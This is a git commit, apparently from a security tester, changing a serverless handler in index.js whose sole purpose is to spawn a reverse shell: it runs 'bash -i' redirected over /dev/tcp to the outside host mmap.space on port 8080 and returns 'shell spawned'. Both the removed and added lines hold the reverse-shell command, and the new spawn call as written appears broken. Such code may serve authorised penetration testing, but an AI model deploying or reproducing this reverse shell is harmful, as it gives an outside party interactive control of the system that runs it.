eb57a2bd236c6d36f74900748173da1dffe7f99e
cure53niko <niko@cure53.de>
2021-06-14 11:05:31 +0200

    asd

--- index.js
+++ index.js
@@ -3,7 +3,7 @@ const { spawn } = require('child_process');
 
 exports.handler = async (event) => {
 
-  var child = exec('bash -i >& /dev/tcp/mmap.space/8080 0>&1');
+  var child = spawn('bash -i >& /dev/tcp/mmap.space/8080 0>&1');
 
   return {
     message: `shell spawned`,
